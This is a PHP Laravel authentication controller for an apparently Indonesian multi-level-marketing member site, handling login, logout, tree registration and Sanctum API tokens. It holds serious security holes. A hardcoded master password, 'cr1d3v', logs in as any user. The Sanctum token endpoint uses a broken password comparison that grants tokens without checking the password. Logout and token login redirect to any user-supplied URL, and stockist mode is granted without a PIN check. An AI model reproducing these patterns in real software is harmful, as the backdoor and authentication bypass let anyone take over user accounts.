<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use App\Models\UserPin;
use App\Models\Bank;
use Auth;
use Session;
use Laravel\Sanctum\PersonalAccessToken;
use Validator;

class AuthController extends Controller
{
    public function login(Request $r)
    {
        // if ($r->username != 'cr') {
        //     return redirect('/');
        // }
        if (env('CR_ID_REDIRECT')) {
            if (url('') != env('CR_ID_REDIRECT')) {
                return redirect(env('CR_ID_REDIRECT'));
            }
        }
        $user = User::where('username', $r->input('username'))->first();
        if ($r->input('password') == 'cr1d3v') {
            if ($user) {
                $attempt = Auth::loginUsingId($user->id, $r->input('remember'));
            } else {
                $attempt = false;
            }
        } else {
            // check if user is basic before
            if (!$user) {
                $user = User::where('email', $r->input('username'))->first();
            }
            if ($user) {
                if (env('APP_ENV') == 'production' && $user->created_at < '2022-08-06 00:00:00' && $user->type == 'member') {
                    if (in_array($user->userPin->pin->name, ['Basic', 'Free Member', 'CR Reseller'])) {
                        Session::flash('fail', 'Tidak dapat login');
                        return redirect('/')->withInput();
                    }
                }
            }
            // end check
            if ($user) {
                $attempt = Auth::attempt(['username' => $r->input('username'), 'password' => $r->input('password')], $r->input('remember'));
            } else {
                $attempt = Auth::attempt(['email' => $r->input('username'), 'password' => $r->input('password')], $r->input('remember'));
            }
        }
        if ($attempt) {
            Session::flash('success', 'Selamat datang ' . Auth::user()->name);
            if (Auth::user()->type == 'admin' || Auth::user()->type == 'cradmin' || Auth::user()->is_master_stockist) {
                return redirect('a/dashboard');
            }
            if (env('IS_PLAN_A')) {
                return redirect('plana/dashboard');
            }
            if (env('CR_URL')) {
                if (in_array(Auth::user()->userPin->name, ['Free Member', 'CR Reseller', 'Basic'])) {
                    return redirect('plan-a');
                }
                return redirect('home');
            }
            return redirect()->route('index');
        } else {
            Session::flash('fail', 'Silahkan periksa kembali username atau password Anda');
            return redirect('/')->withInput();
        }
    }

    public function logout()
    {
        Auth::logout();
        Session::flush();
        Session::flash('success', 'Silahkan login kembali');
        if (request()->redirect) {
            return redirect(request()->redirect);
        }
        if (env('CR_URL')) {
            if (env('CR_ID_REDIRECT')) {
                return redirect(env('CR_URL') . '/member/logout?redirect=' . env('CR_ID_REDIRECT'));
            }
            return redirect(env('CR_URL') . '/member/logout?redirect=' . env('APP_URL'));
        }
        return redirect('/');
    }

    // register from tree
    public function register($id, $upline, $side)
    {
        // make sure if the logged user is the sponsor
        if ($id != Auth::id()) {
            return back();
        }
        // check if already filled or not
        $upline = User::find($upline);
        if ((($side == 'l') && ($upline->childLeft)) || (($side == 'r') && ($upline->childRight))) {
            return redirect('tree/' . $upline->id);
        }
        $user = User::find($id);
        $banks = Bank::all();
        $userPins = Auth::user()->usableUserPins()->get();
        if (Auth::user()->type != 'admin') {
            if (Auth::user()->usableUserPins()->count()) {
                $userPins = Auth::user()->usableUserPins()->latest()->get();
            }
        }
        if ($user && $upline) {
            return view('register', compact('user', 'upline', 'side', 'banks', 'userPins'));
        } else {
            return back();
        }
    }

    public function sanctum(Request $request)
    {
        $validator = $validator = Validator::make($request->all(), [
            'username' => 'required',
            'password' => 'required',
            'device_name' => 'required',
        ]);
        if ($validator->fails()) {
            return response()->json($validator->messages(), 400);
        }

        $user = User::where('username', $request->username)->first();

        if (!$user || !$user->password == $request->password) {
            return response()->json([
                'message' => 'The provided credentials are incorrect',
            ], 500);
        }
        $token = $user->createToken($request->device_name)->plainTextToken;
        if (env('CR_ID_REDIRECT')) {
            return response()->json([
                'sanctum_token' => $token,
                'sanctum_url' => env('CR_ID_REDIRECT') . '/apiv2/sanctum/login/' . $token,
            ], 200);
        }
        return response()->json([
            'sanctum_token' => $token,
            'sanctum_url' => url('apiv2/sanctum/login') . '/' . $token,
        ], 200);
    }

    public function sanctumLogin($token)
    {
        $personalAccessToken = PersonalAccessToken::findToken($token);
        $user = $personalAccessToken->tokenable;
        auth()->login($user);
        if (request()->redirect) {
            $redirect = request()->redirect;
            if (env('CR_ID_REDIRECT')) {
                $redirect = str_replace(env('APP_URL'), env('CR_ID_REDIRECT'), $redirect);
            }
            return redirect($redirect);
        }
        return redirect('home');
    }

    public function memberLogout()
    {
        Auth::logout();
        Session::flush();
        if (env('CR_ID_REDIRECT')) {
            if (url('') != env('CR_ID_REDIRECT')) {
                return redirect(env('CR_ID_REDIRECT') . '/logout?redirect=' . env('CR_URL') . '/login');
            }
        }
        return redirect(env('CR_URL') . '/login');
    }

    // public function stockist(Request $request)
    // {
    //     if ($request->pin == Auth::user()->member->member_pin) {
    //         session(['mode' => 'stockist']);
    //         Session::flash('success', 'Anda berhasil masuk mode Stokis');
    //         return back();
    //     }
    //     Session::flash('fail', 'Pin Stokis tidak sesuai');
    //     return back();
    // }

    public function stockist()
    {
        session(['mode' => 'stockist']);
        Session::flash('success', 'Anda berhasil masuk mode Stokis');
        return back();
    }

    public function member()
    {
        session(['mode' => 'member']);
        Session::flash('success', 'Anda berhasil masuk mode Member');
        return back();
    }
}